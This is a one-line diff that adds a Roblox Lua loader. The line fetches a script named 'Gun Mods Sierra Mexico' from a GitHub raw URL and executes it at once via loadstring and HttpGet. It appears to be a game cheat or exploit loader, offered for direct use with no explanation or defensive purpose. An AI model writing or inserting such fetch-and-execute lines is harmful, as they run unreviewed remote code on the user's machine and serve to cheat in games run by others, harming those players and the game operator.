@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnowXBlood/X-Team-Softworks/refs/heads/main/Gun%20Mods%20Sierra%20Mexico"))()
